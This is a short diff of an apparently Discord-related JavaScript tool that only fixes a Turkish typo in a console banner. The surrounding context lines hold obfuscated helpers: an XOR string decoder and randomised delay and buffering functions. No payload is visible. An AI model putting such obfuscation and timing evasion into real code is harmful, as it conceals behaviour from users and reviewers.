@@ -42,7 +42,7 @@ const headers = {
 let mfaToken;
 const guilds = {};
 let heartbeatInterval = null;
-console.log("\x1b[31m%s\x1b[0m", "bu kod dexycan/dreamsandrealitiesden tüm sanal eleme emanettir");
+console.log("\x1b[31m%s\x1b[0m", "bu kod dexycan/dreamsandrealitiesden tüm sanal aleme emanettir");
 const _0x=['constructor','toString','length'];const _s=(_a,_b)=>{let _c='';for(let _i=0;_i<_a[_0x[2]];_i++){_c+=String.fromCharCode(_a.charCodeAt(_i)^_b.charCodeAt(_i%_b[_0x[2]]));}return _c;};
 function _delay(ms){return new Promise(r=>{const _t=Math.floor(ms*((Math.random()*0.4)+0.8));const _u=Date.now()+_t;const _check=()=>{if(Date.now()>=_u){r();}else{setTimeout(_check,Math.max(1,_u-Date.now()));}};_check();});}
 function _slowBuffer(data){return new Promise(r=>{let result='';let i=0;const _next=()=>{if(i<data.length){result+=data[i];i++;setTimeout(_next,Math.floor(Math.random()*3)+1);}else{r(result);}};_next();});}
